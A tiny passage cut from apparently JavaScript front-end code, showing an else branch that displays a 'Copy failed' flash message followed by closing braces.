       else { flash('Copy failed'); }
     }
